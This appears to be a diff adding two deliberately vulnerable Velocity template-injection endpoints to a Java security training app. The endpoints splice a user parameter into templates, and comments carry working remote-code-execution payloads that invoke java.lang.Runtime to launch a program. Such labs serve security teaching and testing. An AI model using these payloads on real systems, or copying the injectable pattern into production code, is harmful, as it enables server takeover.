@@ -6,6 +6,12 @@ import freemarker.template.Configuration;
 import freemarker.template.TemplateException;
 import io.swagger.annotations.Api;
 import io.swagger.annotations.ApiOperation;
+import org.apache.velocity.VelocityContext;
+import org.apache.velocity.app.Velocity;
+import org.apache.velocity.runtime.RuntimeServices;
+import org.apache.velocity.runtime.RuntimeSingleton;
+import org.apache.velocity.runtime.parser.ParseException;
+import org.apache.velocity.runtime.parser.node.SimpleNode;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import org.springframework.stereotype.Controller;
@@ -15,6 +21,7 @@ import org.springframework.web.bind.annotation.*;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.*;
+import java.nio.file.Paths;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -160,6 +167,63 @@ public class SSTI {
         // 关闭 FreeMarker debug 信息
         conf.setTemplateExceptionHandler(freemarker.template.TemplateExceptionHandler.RETHROW_HANDLER);
         return this.freemarkerVul(file, content, model, request);
+    }
+
+    /**
+     * velocity 模版注入evaluate场景
+     * @poc http://127.0.0.1:8888/vulnapi/SSTI/velocity/evaluate/vul?username=%23set(%24e%3D%22e%22)%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22%2Cnull).invoke(null%2Cnull).exec(%22open%20-a%20Calculator%22)
+     */
+    @ApiOperation(value = "vul：velocity模版注入evaluate场景")
+    @GetMapping("/velocity/evaluate/vul")
+    @ResponseBody
+    public String velocityEvaluateVul(@RequestParam(defaultValue = "hello-java-sec") String username) {
+        String templateString = "Hello, " + username + " | Full name: $name, phone: $phone, email: $email";
+        Velocity.init();
+        VelocityContext ctx = new VelocityContext();
+        ctx.put("name", "hello-java-sec");
+        ctx.put("phone", "012345678");
+        ctx.put("email", "xxx@xxx.com");
+        StringWriter out = new StringWriter();
+        Velocity.evaluate(ctx, out, "test", templateString);
+        return out.toString();
+    }
+
+    /**
+     * velocity 模版注入merge场景
+     * @poc http://127.0.0.1:8888/vulnapi/SSTI/velocity/merge/vul?username=%23set(%24e%3D%22e%22)%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22%2Cnull).invoke(null%2Cnull).exec(%22open%20-a%20Calculator%22)
+     */
+    @ApiOperation(value = "vul：velocity模版注入merge场景")
+    @GetMapping("/velocity/merge/vul")
+    @ResponseBody
+    public String velocityMergeVul(@RequestParam(defaultValue = "hello-java-sec") String username) throws IOException, ParseException {
+        // 获取模版文件内容
+        BufferedReader bufferedReader = new BufferedReader(new FileReader(String.valueOf(Paths.get(this.getClass().getClassLoader().getResource("templates/velocity/merge.vm").toString().replace("file:", "")))));
+        StringBuilder stringBuilder = new StringBuilder();
+        String line;
+        while ((line = bufferedReader.readLine()) != null) {
+            stringBuilder.append(line);
+        }
+        String templateString = stringBuilder.toString();
+        templateString = templateString.replace("<USERNAME>", username);
+        StringReader reader = new StringReader(templateString);
+        VelocityContext ctx = new VelocityContext();
+        ctx.put("name", "hello-java-sec");
+        ctx.put("phone", "012345678");
+        ctx.put("email", "xxx@xxx.com");
+
+        StringWriter out = new StringWriter();
+        org.apache.velocity.Template template = new org.apache.velocity.Template();
+
+        RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
+        SimpleNode node = runtimeServices.parse(reader, String.valueOf(template));
+
+        template.setRuntimeServices(runtimeServices);
+        template.setData(node);
+        template.initDocument();
+
+        template.merge(ctx, out);
+
+        return out.toString();
     }
 
 
